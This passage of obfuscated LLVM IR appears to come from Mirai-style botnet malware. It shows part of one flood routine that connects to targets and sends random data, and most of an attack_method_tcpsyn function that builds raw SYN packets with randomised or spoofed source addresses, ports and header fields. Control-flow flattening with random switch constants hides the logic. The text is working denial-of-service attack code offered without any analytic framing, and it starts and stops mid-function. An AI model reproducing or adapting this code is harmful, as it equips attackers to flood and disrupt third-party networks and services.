  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 1
  %137 = load i32, i32* %136, align 4
  %138 = call i32 @ntohl(i32 %137) #7
  %139 = call i32 @rand_next()
  %140 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %141 = load i32, i32* %9, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %140, i64 %142
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i32 0, i32 2
  %145 = load i8, i8* %144, align 4
  %146 = zext i8 %145 to i32
  %147 = lshr i32 %139, %146
  %148 = add i32 %138, %147
  %149 = call i32 @htonl(i32 %148) #7
  %150 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %151 = load i32, i32* %9, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i64 %152
  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %153, i32 0, i32 0
  %155 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %154, i32 0, i32 2
  %156 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %155, i32 0, i32 0
  store i32 %149, i32* %156, align 4
  store i32 419167806, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i32*, i32** %11, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds i32, i32* %158, i64 %160
  %162 = load i32, i32* %161, align 4
  %163 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 0
  %169 = bitcast %struct.sockaddr_in* %168 to %struct.sockaddr*
  store %struct.sockaddr* %169, %struct.sockaddr** %163, align 8
  %170 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %171 = load %struct.sockaddr*, %struct.sockaddr** %170, align 8
  %172 = call i32 @connect(i32 %162, %struct.sockaddr* %171, i32 16)
  %173 = icmp eq i32 %172, -1
  %174 = select i1 %173, i32 -1374297545, i32 1652258433
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 1652258433, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 -1920187934, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %9, align 4
  %179 = add nsw i32 %178, 1
  store i32 %179, i32* %9, align 4
  store i32 -1213769070, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  store i32 -849184331, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 819955137, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i32, i32* %9, align 4
  %184 = load i8, i8* %5, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp slt i32 %183, %185
  %187 = select i1 %186, i32 438929603, i32 1635020186
  store i32 %187, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i8**, i8*** %10, align 8
  %190 = load i32, i32* %9, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8*, i8** %189, i64 %191
  %193 = load i8*, i8** %192, align 8
  store i8* %193, i8** %22, align 8
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  %196 = select i1 %195, i32 -1113095946, i32 503103815
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i8*, i8** %22, align 8
  %199 = load i16, i16* %14, align 2
  %200 = zext i16 %199 to i32
  call void @rand_str(i8* %198, i32 %200)
  store i32 503103815, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i32*, i32** %11, align 8
  %203 = load i32, i32* %9, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds i32, i32* %202, i64 %204
  %206 = load i32, i32* %205, align 4
  %207 = load i8*, i8** %22, align 8
  %208 = load i16, i16* %14, align 2
  %209 = zext i16 %208 to i64
  %210 = call i64 @send(i32 %206, i8* %207, i64 %209, i32 16384)
  store i32 -955774606, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = load i32, i32* %9, align 4
  %213 = add nsw i32 %212, 1
  store i32 %213, i32* %9, align 4
  store i32 819955137, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  store i32 -849184331, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %214, %211, %201, %197, %188, %182, %181, %180, %177, %176, %175, %157, %131, %121, %120, %102, %93, %84, %75, %65, %59, %58, %55, %52, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -1000448778, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1000448778, label %first
    i32 -1906014190, label %99
    i32 -441591687, label %100
    i32 -1563552944, label %106
    i32 2103303309, label %109
    i32 1631482431, label %110
    i32 -154545921, label %116
    i32 611351757, label %160
    i32 707392697, label %164
    i32 -2138134814, label %289
    i32 -206126901, label %292
    i32 -100098870, label %293
    i32 441717221, label %294
    i32 693856904, label %300
    i32 -681434429, label %320
    i32 861580049, label %341
    i32 -778775026, label %345
    i32 327152157, label %349
    i32 -1163125533, label %354
    i32 1373129273, label %360
    i32 215287438, label %365
    i32 1291996266, label %371
    i32 1940523376, label %376
    i32 -44813425, label %382
    i32 1911679690, label %386
    i32 1918414825, label %390
    i32 123752756, label %394
    i32 205157869, label %398
    i32 1900798109, label %402
    i32 -1398543524, label %408
    i32 268527712, label %446
    i32 1083244157, label %449
    i32 1186929160, label %450
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %97 = icmp eq i32 %.reload, -1
  %98 = select i1 %97, i32 -1906014190, i32 -441591687
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  store i32 1186929160, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %101 = load i32, i32* %10, align 4
  %102 = bitcast i32* %9 to i8*
  %103 = call i32 @setsockopt(i32 %101, i32 0, i32 3, i8* %102, i32 4) #6
  %104 = icmp eq i32 %103, -1
  %105 = select i1 %104, i32 -1563552944, i32 2103303309
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %10, align 4
  %108 = call i32 @close(i32 %107)
  store i32 1186929160, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1631482431, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %9, align 4
  %112 = load i8, i8* %5, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp slt i32 %111, %113
  %115 = select i1 %114, i32 -154545921, i32 -206126901
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call noalias i8* @calloc(i64 128, i64 1) #6
  %118 = load i8**, i8*** %11, align 8
  %119 = load i32, i32* %9, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8*, i8** %118, i64 %120
  store i8* %117, i8** %121, align 8
  %122 = load i8**, i8*** %11, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds i8*, i8** %122, i64 %124
  %126 = load i8*, i8** %125, align 8
  %127 = bitcast i8* %126 to %struct.iphdr*
  store %struct.iphdr* %127, %struct.iphdr** %27, align 8
  %128 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i64 1
  %130 = bitcast %struct.iphdr* %129 to %struct.tcphdr*
  store %struct.tcphdr* %130, %struct.tcphdr** %28, align 8
  %131 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %132 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %131, i64 1
  %133 = bitcast %struct.tcphdr* %132 to i8*
  store i8* %133, i8** %29, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %135 = bitcast %struct.iphdr* %134 to i8*
  %136 = load i8, i8* %135, align 4
  %137 = and i8 %136, 15
  %138 = or i8 %137, 64
  store i8 %138, i8* %135, align 4
  %139 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, -16
  %143 = or i8 %142, 5
  store i8 %143, i8* %140, align 4
  %144 = load i8, i8* %12, align 1
  %145 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 1
  store i8 %144, i8* %146, align 1
  %147 = call zeroext i16 @htons(i16 zeroext 60) #7
  %148 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 2
  store i16 %147, i16* %149, align 2
  %150 = load i16, i16* %13, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 3
  store i16 %151, i16* %153, align 4
  %154 = load i8, i8* %14, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 5
  store i8 %154, i8* %156, align 4
  %157 = load i8, i8* %15, align 1
  %158 = icmp ne i8 %157, 0
  %159 = select i1 %158, i32 611351757, i32 707392697
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 4
  store i16 %161, i16* %163, align 2
  store i32 707392697, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 6
  store i8 6, i8* %166, align 1
  %167 = load i32, i32* %26, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 8
  store i32 %167, i32* %169, align 4
  %170 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %171 = load i32, i32* %9, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i64 %172
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i32 0, i32 1
  %175 = load i32, i32* %174, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 9
  store i32 %175, i32* %177, align 4
  %178 = load i16, i16* %16, align 2
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 0
  store i16 %179, i16* %181, align 4
  %182 = load i16, i16* %17, align 2
  %183 = call zeroext i16 @htons(i16 zeroext %182) #7
  %184 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 1
  store i16 %183, i16* %185, align 2
  %186 = load i32, i32* %18, align 4
  %187 = trunc i32 %186 to i16
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = zext i16 %188 to i32
  %190 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 2
  store i32 %189, i32* %191, align 4
  %192 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -241
  %196 = or i16 %195, 160
  store i16 %196, i16* %193, align 4
  %197 = load i8, i8* %20, align 1
  %198 = sext i8 %197 to i16
  %199 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %199, i32 0, i32 4
  %201 = load i16, i16* %200, align 4
  %202 = and i16 %198, 1
  %203 = shl i16 %202, 13
  %204 = and i16 %201, -8193
  %205 = or i16 %204, %203
  store i16 %205, i16* %200, align 4
  %206 = load i8, i8* %21, align 1
  %207 = sext i8 %206 to i16
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 4
  %210 = load i16, i16* %209, align 4
  %211 = and i16 %207, 1
  %212 = shl i16 %211, 12
  %213 = and i16 %210, -4097
  %214 = or i16 %213, %212
  store i16 %214, i16* %209, align 4
  %215 = load i8, i8* %22, align 1
  %216 = sext i8 %215 to i16
  %217 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %216, 1
  %221 = shl i16 %220, 11
  %222 = and i16 %219, -2049
  %223 = or i16 %222, %221
  store i16 %223, i16* %218, align 4
  %224 = load i8, i8* %23, align 1
  %225 = sext i8 %224 to i16
  %226 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %225, 1
  %230 = shl i16 %229, 10
  %231 = and i16 %228, -1025
  %232 = or i16 %231, %230
  store i16 %232, i16* %227, align 4
  %233 = load i8, i8* %24, align 1
  %234 = sext i8 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 4
  %237 = load i16, i16* %236, align 4
  %238 = and i16 %234, 1
  %239 = shl i16 %238, 9
  %240 = and i16 %237, -513
  %241 = or i16 %240, %239
  store i16 %241, i16* %236, align 4
  %242 = load i8, i8* %25, align 1
  %243 = sext i8 %242 to i16
  %244 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = and i16 %243, 1
  %248 = shl i16 %247, 8
  %249 = and i16 %246, -257
  %250 = or i16 %249, %248
  store i16 %250, i16* %245, align 4
  %251 = load i8*, i8** %29, align 8
  %252 = getelementptr inbounds i8, i8* %251, i32 1
  store i8* %252, i8** %29, align 8
  store i8 2, i8* %251, align 1
  %253 = load i8*, i8** %29, align 8
  %254 = getelementptr inbounds i8, i8* %253, i32 1
  store i8* %254, i8** %29, align 8
  store i8 4, i8* %253, align 1
  %255 = call i32 @rand_next()
  %256 = and i32 %255, 15
  %257 = add i32 1400, %256
  %258 = trunc i32 %257 to i16
  %259 = call zeroext i16 @htons(i16 zeroext %258) #7
  %260 = load i8*, i8** %29, align 8
  %261 = bitcast i8* %260 to i16*
  store i16 %259, i16* %261, align 2
  %262 = load i8*, i8** %29, align 8
  %263 = getelementptr inbounds i8, i8* %262, i64 2
  store i8* %263, i8** %29, align 8
  %264 = load i8*, i8** %29, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %29, align 8
  store i8 4, i8* %264, align 1
  %266 = load i8*, i8** %29, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %29, align 8
  store i8 2, i8* %266, align 1
  %268 = load i8*, i8** %29, align 8
  %269 = getelementptr inbounds i8, i8* %268, i32 1
  store i8* %269, i8** %29, align 8
  store i8 8, i8* %268, align 1
  %270 = load i8*, i8** %29, align 8
  %271 = getelementptr inbounds i8, i8* %270, i32 1
  store i8* %271, i8** %29, align 8
  store i8 10, i8* %270, align 1
  %272 = call i32 @rand_next()
  %273 = load i8*, i8** %29, align 8
  %274 = bitcast i8* %273 to i32*
  store i32 %272, i32* %274, align 4
  %275 = load i8*, i8** %29, align 8
  %276 = getelementptr inbounds i8, i8* %275, i64 4
  store i8* %276, i8** %29, align 8
  %277 = load i8*, i8** %29, align 8
  %278 = bitcast i8* %277 to i32*
  store i32 0, i32* %278, align 4
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i64 4
  store i8* %280, i8** %29, align 8
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 1, i8* %281, align 1
  %283 = load i8*, i8** %29, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %29, align 8
  store i8 3, i8* %283, align 1
  %285 = load i8*, i8** %29, align 8
  %286 = getelementptr inbounds i8, i8* %285, i32 1
  store i8* %286, i8** %29, align 8
  store i8 3, i8* %285, align 1
  %287 = load i8*, i8** %29, align 8
  %288 = getelementptr inbounds i8, i8* %287, i32 1
  store i8* %288, i8** %29, align 8
  store i8 6, i8* %287, align 1
  store i32 -2138134814, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i32, i32* %9, align 4
  %291 = add nsw i32 %290, 1
  store i32 %291, i32* %9, align 4
  store i32 1631482431, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  store i32 -100098870, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 441717221, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %9, align 4
  %296 = load i8, i8* %5, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp slt i32 %295, %297
  %299 = select i1 %298, i32 693856904, i32 1083244157
  store i32 %299, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  %301 = load i8**, i8*** %11, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  %305 = load i8*, i8** %304, align 8
  store i8* %305, i8** %30, align 8
  %306 = load i8*, i8** %30, align 8
  %307 = bitcast i8* %306 to %struct.iphdr*
  store %struct.iphdr* %307, %struct.iphdr** %31, align 8
  %308 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i64 1
  %310 = bitcast %struct.iphdr* %309 to %struct.tcphdr*
  store %struct.tcphdr* %310, %struct.tcphdr** %32, align 8
  %311 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 2
  %316 = load i8, i8* %315, align 4
  %317 = zext i8 %316 to i32
  %318 = icmp slt i32 %317, 32
  %319 = select i1 %318, i32 -681434429, i32 861580049
  store i32 %319, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %321, i64 %323
  %325 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %324, i32 0, i32 1
  %326 = load i32, i32* %325, align 4
  %327 = call i32 @ntohl(i32 %326) #7
  %328 = call i32 @rand_next()
  %329 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i32 0, i32 2
  %334 = load i8, i8* %333, align 4
  %335 = zext i8 %334 to i32
  %336 = lshr i32 %328, %335
  %337 = add i32 %327, %336
  %338 = call i32 @htonl(i32 %337) #7
  %339 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 9
  store i32 %338, i32* %340, align 4
  store i32 861580049, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i32, i32* %26, align 4
  %343 = icmp eq i32 %342, -1
  %344 = select i1 %343, i32 -778775026, i32 327152157
  store i32 %344, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = call i32 @rand_next()
  %347 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 8
  store i32 %346, i32* %348, align 4
  store i32 327152157, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i16, i16* %13, align 2
  %351 = zext i16 %350 to i32
  %352 = icmp eq i32 %351, 65535
  %353 = select i1 %352, i32 -1163125533, i32 1373129273
  store i32 %353, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = call i32 @rand_next()
  %356 = and i32 %355, 65535
  %357 = trunc i32 %356 to i16
  %358 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 3
  store i16 %357, i16* %359, align 4
  store i32 1373129273, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i16, i16* %16, align 2
  %362 = zext i16 %361 to i32
  %363 = icmp eq i32 %362, 65535
  %364 = select i1 %363, i32 215287438, i32 1291996266
  store i32 %364, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %366 = call i32 @rand_next()
  %367 = and i32 %366, 65535
  %368 = trunc i32 %367 to i16
  %369 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %370 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %369, i32 0, i32 0
  store i16 %368, i16* %370, align 4
  store i32 1291996266, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load i16, i16* %17, align 2
